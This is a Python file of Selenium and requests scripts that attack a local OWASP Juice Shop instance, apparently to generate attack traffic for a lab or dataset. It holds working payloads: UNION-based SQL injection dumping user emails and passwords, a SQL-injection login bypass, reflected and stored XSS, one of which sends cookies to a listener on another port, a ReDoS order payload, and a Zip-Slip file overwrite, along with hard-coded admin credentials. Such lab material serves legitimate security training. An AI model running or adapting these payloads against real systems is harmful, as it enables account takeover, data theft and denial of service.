import time
import requests
import random

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from abc import ABC, abstractmethod

from ..userAction_headless import User


BASE_URL = "http://localhost:3000"


class Attack(ABC):
    """
    abstract class wich provides
    base url
    chromedriver for accesing browser
    relative directory name
    """
    def __init__(self):
        self.base_url = BASE_URL
        self.chrome_options = Options()
        self.chrome_options.add_argument("--no-sandbox")
        self.chrome_options.add_argument("--window-size=1480,996")
        self.chrome_options.add_argument("--incognito")
        super().__init__()

    @abstractmethod
    def run(self):
        pass


class SQLInjection(Attack):
    """
    Manages two types of SQLInjection with same base url
    and chrome options for using selenium
    """

    def run(self):
        driver = webdriver.Chrome(options=self.chrome_options)
        time.sleep(2)
        sql_query = "/rest/products/search?q=qwert%27%29%29%20" \
            "UNION%20SELECT%20id%2C%20email%2C%20password%2C%2" \
            "0%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2" \
            "C%20%278%27%2C%20%279%27%20FROM%20Users--"
        driver.get(self.base_url + sql_query)
        time.sleep(3)
        driver.quit()

    def run_tryhard(self):
        driver = webdriver.Chrome(options=self.chrome_options)
        driver.get(self.base_url)
        time.sleep(2)
        driver.get(self.base_url + "/rest/products/search?q=")
        time.sleep(2)
        # Comment last part with no error
        driver.get(self.base_url + "/rest/products/search?q='))--")
        time.sleep(2)
        # find out correct amount of columns
        # UNION SELECT '1', '2', '3', '4' FROM Users
        driver.get(self.base_url + "/rest/products/search?q='))%20"
                   "UNION%20SELECT%20%271%27%2C%20%272%27%2C%20%273%27%2C"
                   "%20%274%27%20FROM%20Users--")
        time.sleep(2)
        # UNION SELECT '1', '2', '3', '4', '5' FROM Users
        driver.get(self.base_url + "/rest/products/search?q='))%20"
                   "UNION%20SELECT%20%271%27%2C%20%272%27%2C%20%273%27%2C"
                   "%20%274%27%2C%20%275%27%20FROM%20Users--")
        time.sleep(2)
        # UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM Users
        driver.get(self.base_url + "/rest/products/search?q='))%20"
                   "UNION%20SELECT%20%271%27%2C%20%272%27%2C%20%273%27%2C"
                   "%20%274%27%2C%20%275%27%20%276%27%2C%20%277%27%2C%20%"
                   "278%27%2C%20%279%27%2C%20FROM%20Users--")
        time.sleep(2)
        driver.get(self.base_url + "/rest/products/search?q=qwert%"
                   "27%29%29%20UNION%20SELECT%20email%2C%20%272%27%2C%20%"
                   "273%27%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%2"
                   "77%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--")
        time.sleep(2)
        driver.get(self.base_url + "/rest/products/search?q=qwert%"
                   "27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20passwo"
                   "rd%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%2"
                   "7%2C%20%278%27%2C%20%279%27%20FROM%20Users--")
        time.sleep(2)
        driver.quit()


class FalseJWTLogin(Attack):
    """
    tries to login as non existing user
    using sql injection in login form to recieve false JSON Web Token
    """

    def __init__(self):
        super().__init__()
        self.attack_vector = ("' UNION SELECT * FROM "
                              "(SELECT 15 as 'id', "
                              "'' as 'username', "
                              "'acc0unt4nt@juice-sh.op' as 'email', "
                              "'12345' as 'password', "
                              "'accounting' as 'role',"
                              "'123' as 'deluxeToken', "
                              "'1.2.3.4' as 'lastLoginIp' , "
                              "'/assets/public/images/uploads/default.svg' "
                              "as 'profileImage',"
                              "'' as 'totpSecret',"
                              " 1 as 'isActive', "
                              "'1999-08-16 14:14:41.644 +00:00'"
                              " as 'createdAt',"
                              "'1999-08-16 14:33:41.930 +00:00'"
                              " as 'updatedAt', "
                              "null as 'deletedAt')--")
        self.chrome_options.add_argument("--kiosk")

    def run(self):
        """
        open Browser and enter SQLInjection in email field
        add cookie to prevent welcome banner
        """
        driver = webdriver.Chrome(options=self.chrome_options)
        driver.get(self.base_url + "/#/login")
        # get rid of pop up window by clicking in top right corner
        driver.find_element_by_xpath(
                """//div[contains(@class,"cdk-overlay-pane")]
                //button[@aria-label="Close Welcome Banner"]"""
                    ).click()
        # find email box
        email_box = driver.find_element_by_name('email')
        # enter email address --> Attack vector
        email_box.send_keys(self.attack_vector)
        # find password box
        pass_box = driver.find_element_by_name('password')
        # enter password
        pass_box.send_keys('something')
        # find login button
        login_button = driver.find_element_by_xpath(
                """//div[contains(@id, "login-form")]
                //button[@id="loginButton"]"""
                )
        # click button
        login_button.click()
        time.sleep(1)


class XSSAttack(Attack):
    """
    Two types of xss attack
        first tries to display cookie information in iframe
        second tries to send cookie information to external ip
    """
    def run(self, form):
        if form == "simple":
            self.run_simple()
        else:
            self.run_advanced()

    def run_simple(self):
        driver = webdriver.Chrome(options=self.chrome_options)
        # open base url
        driver.get(self.base_url)
        time.sleep(2)
        # show cookie in new iframe
        attack_url = "http://localhost:3000/#/search?q=%3Cifram" \
                     "e%20src%3D%22javascript:alert(document.cookie)%22%3E"
        driver.get(attack_url)
        time.sleep(2)

    def run_advanced(self):
        """
        send curl request to api/Users for persistent xss attack
        try to send cookie information to netcat listener
        when admin visits /administration xss is run and information sent
        """

        url = self.base_url + "/api/Users"

        random_number = random.randint(0,99999)
        payload = "{\"email\": \"<img src=\\\"http://127.0.0.1:8081/cookie.php?c=\\\" + document.cookie;>\", \"password\": \"" + str(random_number )+ "\"}"
        #payload = "{\"email\": \"<script>new Image().src=\\\"http://127.0.0.1:8081/cookie.php?c=abc\\\";</script>\", \"password\": \"xss\"}"

        headers = {
            'Content-Type': 'application/json'
        }

        response = requests.request(
                "POST",
                url,
                headers=headers,
                data=payload)

        print(response.text.encode('utf8'))
        # login as admin
        time.sleep(3)
        admin = User(
                email='admin@juice-sh.op',
                password='admin123',
                security_question='middlename',
                user_number=7,
                visible=True)
        admin.login()
        admin.driver.get(self.base_url + "/#/administration")
        time.sleep(10)


class SensitiveDataExposure(Attack):
    """
    access sensitive data which is accidently exposed
    """
    def __init__(self):
        super().__init__()

    def run(self, exposed_file_path):
        driver = webdriver.Chrome(options=self.chrome_options)
        time.sleep(2)
        driver.get(self.base_url + exposed_file_path)
        time.sleep(5)


class RemoteCodeExecution(Attack):
    """
    Execute commands through api interface at /api-docs/#/Order/post_orders
    Keep server busy using regex
    Authorization token needed vor B2B Api -> create user and extract token
    """
    def __init__(self):
        super().__init__()
        self.code = """{"orderLinesData":
            "/((a+)+)b/.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaa')"}"""

    def get_cookie(self):
        """
        create account to extract authorization token
        """
        random_number = random.randint(0,10000000)
        email = str(random_number) + "@email.com"
        random_user = User(
                email=email,
                password='123123',
                security_question='middlename',
                user_number=7,
                visible=False)
        random_user.register()
        random_user.login()
        cookie_list = random_user.driver.get_cookies()
        print(cookie_list)
        print(cookie_list[1]['value'])
        return cookie_list[1]['value']

    def run(self, token=None, code=None):
        if token is None:
            token = self.get_cookie()
        if code is None:
            code = self.code
        driver = webdriver.Chrome(options=self.chrome_options)
        time.sleep(2)
        driver.get(self.base_url + "/api-docs/#/Order/post_orders")
        time.sleep(3)
        # Enter Authorization Bearer
        # open form to be able to print token
        driver.find_element_by_xpath("/html/body/div/section/di"
                "v[2]/div[2]/div[2]/section/div[2]/button").click()
        token_input = driver.find_element_by_xpath("/html/body/"
                "div/section/div[2]/div[2]/div[2]/section/div[2"
                "]/div/div[2]/div/div/div[2]/div/form/div[1]/di"
                "v[2]/section/input")
        token_input.send_keys(token)
        time.sleep(2)
        # confirm authorization
        driver.find_element_by_xpath("/html/body/div/section/di"
                "v[2]/div[2]/div[2]/section/div[2]/div/div[2]/d"
                "iv/div/div[2]/div/form/div[2]/button[1]").click()
        time.sleep(2)
        # close form
        driver.find_element_by_xpath("/html/body/div/section/di"
                "v[2]/div[2]/div[2]/section/div[2]/div/div[2]/d"
                "iv/div/div[2]/div/form/div[2]/button[2]").click()
        time.sleep(2)
        # click try it out button to be able to enter test code
        driver.find_element_by_xpath("/html/body/div/section/di"
                "v[2]/div[2]/div[4]/section/div/span/div/div/sp"
                "an/div/div[2]/div/div[2]/div[1]/div[2]/button").click()
        time.sleep(5)
        # remove example input
        payload_input = driver.find_element_by_xpath("/html/bod"
                "y/div/section/div[2]/div[2]/div[4]/section/div"
                "/span/div/div/span/div/div[2]/div/div[2]/div[3"
                "]/div[2]/div/div[2]/div/textarea")
        payload_input.clear()
        time.sleep(2)
        # send own code payload
        payload_input.send_keys(code)
        # execute malicious payload
        driver.find_element_by_xpath("/html/body/div/section/di"
                "v[2]/div[2]/div[4]/section/div/span/div/div/sp"
                "an/div/div[2]/div/div[3]/button").click()
        time.sleep(7)
        driver.quit()


class FileOverride(Attack):
    """
    Exploits Zip-Slip vulnerability at /#/complain
    File traversal to override /ftp/legal.md
    Zip file contains ../../ftp/legal.md
    """

    def __init__(self):
        super().__init__()

    def run(self):
        random_user = User(
                email='admin@juice-sh.op',
                password='admin123',
                security_question='middlename',
                user_number=7,
                visible=False)
        random_user.login()
        random_user.complain(file_path = '/Files/zipslip.zip')


class TwoFactor:
    """
    Steps to attack 2FA:
    -> SQLInjection to receive totpsecret:  of 2FA of user wurstbrot
    """
    def run():
        pass
